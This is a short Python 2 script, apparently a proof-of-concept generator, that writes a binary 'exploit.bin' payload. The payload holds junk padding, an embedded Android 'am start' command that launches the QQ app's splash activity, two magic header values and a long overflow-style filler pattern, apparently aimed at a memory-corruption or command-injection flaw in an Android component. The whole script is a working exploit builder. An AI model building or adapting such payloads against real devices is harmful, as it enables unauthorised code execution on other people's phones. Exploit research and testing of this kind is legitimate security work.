import sys
import struct

def generate_exp():
	try:
		f = open("exploit.bin", 'wb')
		junk ='A'*16
		command='am start -n com.tencent.mobileqq/com.tencent.mobileqq.activity.SplashActivity'

		junk+=command
		#junk&command
		StrFormat = ''
		StrFormat +=str(len(junk))+'s'	
		
		#splitter
		splitter=0
		StrFormat +='i'

		#padding
		padding_len = 4-len(junk)%4 
		padding = 'B'*padding_len
		StrFormat += str(padding_len)+'s'
		

		length= 200-len(junk)-4-4-2		
		
		junk_2 = length*'B'
		StrFormat +=str(len(junk_2))+'s'

		head_1=0x4278f501
		head_2=0x00001204
		StrFormat +='ii'
		
		flashed = ''
		base = 'A'
		for num in range(64-2):
			flashed += chr(ord(base)+num%26)*4
		StrFormat+=str(len(flashed))+'s'
		
		print StrFormat
		deadbeef=struct.pack(StrFormat, junk,splitter, padding, junk_2, head_1, head_2,flashed)
		
		f.write(deadbeef)
		print 'ok2'
		f.close()

	except struct.error, e:
		print e.message
	#except Exception:
		print "error!" 
	

if __name__=='__main__':
	generate_exp()
